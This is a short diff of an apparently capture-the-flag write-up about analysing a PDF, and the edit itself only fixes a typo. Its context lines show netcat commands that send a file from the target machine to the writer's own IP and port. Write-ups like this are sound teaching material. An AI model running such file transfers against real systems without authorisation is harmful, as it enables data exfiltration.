@@ -23,7 +23,7 @@ nc -l -p 3131 > pdf.pdf
 nc -N my_IP 3131 < pdfname.pdf 
 ```
 
-- I treid using the common tools like `exiftool`, `binwalk`, `strings`, `pdfinfo` but with no luck.
+- I tried using the common tools like `exiftool`, `binwalk`, `strings`, `pdfinfo` but with no luck.
 
 - I came across `pdfimages` while googling for tools that might help and the syntax is as follows
 
